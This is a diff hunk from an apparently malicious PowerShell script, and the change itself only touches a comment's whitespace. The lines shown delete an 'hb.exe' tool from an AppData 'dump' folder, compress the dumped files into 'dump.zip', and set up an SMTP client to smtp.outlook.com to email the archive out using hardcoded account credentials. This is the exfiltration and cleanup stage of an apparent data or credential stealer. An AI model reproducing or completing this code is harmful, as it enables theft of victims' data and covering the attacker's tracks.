@@ -10,7 +10,7 @@ Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
-#Mailing the output you will need to enable less secure app access on your google account for this to work
+#Mailing the output you will need to enable less secure app access on your google account for this to work 
 $Message = new-object Net.Mail.MailMessage
 $smtp = new-object Net.Mail.SmtpClient("smtp.outlook.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("email here @outlook.com", "email password");
